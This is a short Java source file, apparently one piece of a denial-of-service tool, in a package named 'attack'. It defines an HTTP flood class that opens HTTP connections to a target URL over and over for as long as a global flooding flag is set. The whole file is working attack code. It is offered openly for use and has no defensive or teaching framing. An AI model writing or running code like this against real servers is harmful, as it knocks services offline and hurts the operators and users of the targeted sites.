package attack;

import java.net.HttpURLConnection;
import java.net.URL;

public class HTTP extends Attack {

	public HTTP(String t) {
		super(t, -1);
	}

	public void run() {
		while (Attack.isFlooding()) {
			try {
				URL url = new URL(super.getTarget());
				HttpURLConnection con = (HttpURLConnection) url.openConnection();
				con.connect();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
